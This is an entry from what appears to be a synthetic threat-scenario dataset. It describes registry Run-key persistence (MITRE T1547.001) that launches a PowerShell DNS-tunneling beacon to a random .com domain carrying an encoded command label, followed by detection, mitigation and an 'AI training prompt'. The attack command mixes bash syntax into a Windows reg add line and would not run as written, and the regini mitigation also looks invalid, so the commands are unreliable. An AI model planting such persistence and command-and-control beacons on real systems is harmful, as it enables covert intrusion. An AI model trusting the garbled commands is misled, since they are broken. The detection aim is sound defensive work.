---
type: campaign
scenario_id: 364
tactic: Persistence
technique: "T1547.001: Registry Run Keys / Startup Folder"
technique_id: T1547.001
tags: [campaign, lotl, persistence]
---

# Adding DNS tunneling script to Run registry key.

## Threat Description
Adding DNS tunneling script to Run registry key.

## Attack Command
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d "powershell -c 'Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)'" /f
```

## Detection Logic
Monitor Run key: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run | findstr Resolve-DnsName`; Event ID 4657.

## Mitigation
Restrict Run writes: `regini -h deny HKCU\Software\Microsoft\Windows\CurrentVersion\Run`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.

## AI Training Prompt
Train AI to detect DNS tunneling persistence via Run registry by analyzing Resolve-DnsName commands, base64-encoded subdomains, and registry modifications; suggest registry protections.

## References
- MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
